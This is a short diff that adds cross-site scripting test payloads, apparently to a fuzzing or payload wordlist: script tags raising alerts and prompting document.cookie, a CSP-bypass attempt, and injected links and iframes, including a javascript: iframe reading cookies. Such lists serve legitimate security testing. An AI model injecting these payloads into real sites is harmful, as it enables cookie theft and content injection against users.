@@ -1,1 +1,7 @@
-<script>alert1</script>
+<script>alert("XSS")</script>
+<script>alert(document.domain)</script>
+"><script>prompt(document.cookie)</script>
+<script>alert(1)<script>&token=;script-src-elem'unsafe-inline'
+"><A HREF="https://www.cia.gov/">Login Here </A>
+"><iframe src="https://www.nasa.gov/">
+<IFRAME SRC="javascript:alert(document.cookie);"> </iframe>
